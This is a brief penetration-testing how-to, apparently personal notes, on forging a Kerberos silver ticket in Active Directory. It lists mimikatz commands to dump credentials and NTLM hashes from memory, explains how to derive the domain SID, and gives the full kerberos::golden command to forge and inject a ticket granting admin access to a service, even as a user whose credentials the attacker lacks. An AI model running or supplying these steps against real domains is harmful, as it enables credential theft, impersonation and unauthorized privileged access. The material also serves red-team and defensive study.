# What is it?
With the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example, the IIS application) with any permissions we desire. This custom-created ticket is known as a silver ticket and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.
# How to do it
In general, we need to collect the following three pieces of information to create a silver ticket:
* SPN password hash
* Domain SID
* Target SPN
## Get the target SPN
See AS-REP/Kerberoasting to find service accounts.
## Get the SPN Password Hash
On mimikatz, use the following:
```
privilege::debug
```
```
sekurlsa::logonpasswords
```
Note the NTLM hash of the SPN the silver ticket is for. 
## Get the Domain SID
```
whoami /user
```
Everything up until the last 4 numbers of the user SID is the domain SID.

e.g. 
User SID = S-1-5-21-1987370270-658905905-1781884369-1105

Domain SID = S-1-5-21-1987370270-658905905-1781884369
## Crafting the ticket
Note: "Service type" would be the kind of service the account provides. i.e. "iis_service" account would be "http" type.

Also, Admin user can be any admin user - even one you don't have creds for.

In mimikatz on the target, run the following:
```
kerberos::golden /sid:$(DOMAIN_SID) /domain:$(DOMAIN) /ptt /target:($HOSTNAME_OF_TARGET_WHERE_SPN_RUNS) /service:$(SERVICE_TYPE) /rc4:$(NTLM_OF_SPN) /user:$(ADMIN_USER)
```
